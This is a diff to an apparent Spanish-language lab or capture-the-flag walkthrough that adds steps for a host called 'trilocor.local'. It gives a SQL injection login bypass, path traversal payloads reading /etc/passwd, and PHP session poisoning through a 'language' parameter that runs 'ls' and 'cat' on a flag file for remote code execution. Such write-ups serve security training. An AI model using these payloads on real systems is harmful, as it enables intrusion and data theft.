@@ -248,12 +248,44 @@ Con Burpsuite realizamos estas inyecciones.
 
 ```
 GET /index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%271%27--+- HTTP/1.1
-http://trilocor.local:8088/index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%271%27--+-
+....//....//....//....//....//....//....//etc/passwd
 ```
 
 ### task 3
 
 <figure><img src="../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>
+
+vemos que hay unn apartado de language suele haber vuln de lfi + path traversal ahí así que probamos
+
+<figure><img src="../.gitbook/assets/image (1755).png" alt=""><figcaption></figcaption></figure>
+
+```
+....//....//....//....//....//....//....//etc/passwd
+```
+
+<figure><img src="../.gitbook/assets/image (1757).png" alt=""><figcaption></figcaption></figure>
+
+HACEMOS SESSION POISONING
+
+<figure><img src="../.gitbook/assets/image (1758).png" alt=""><figcaption></figcaption></figure>
+
+rce
+
+```
+language=<%3fphp+system("ls+-l+/");%3b%3f>
+```
+
+<figure><img src="../.gitbook/assets/image (1760).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (1759).png" alt=""><figcaption></figcaption></figure>
+
+```
+language=<%3fphp+system("cat+/22b8c7c1b01399ed2aae1bf840acfc74.txt")%3b+%3f>
+```
+
+....//....//....//....//....//....//....//var/lib/php/sessions/sess\_rjt6907i6b8ae6bq505ek653at
+
+<figure><img src="../.gitbook/assets/image (1761).png" alt=""><figcaption></figcaption></figure>
 
 ### Public Relations PR (8009) -> task 8
 
@@ -465,4 +497,9 @@ listado sistema raiz
 
 <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 132938.png" alt=""><figcaption></figcaption></figure>
 
+### task 10
+
 <figure><img src="../.gitbook/assets/image (1754).png" alt=""><figcaption></figcaption></figure>
+
+## explotación de LFI a RCE mediante Session Poisoning
+
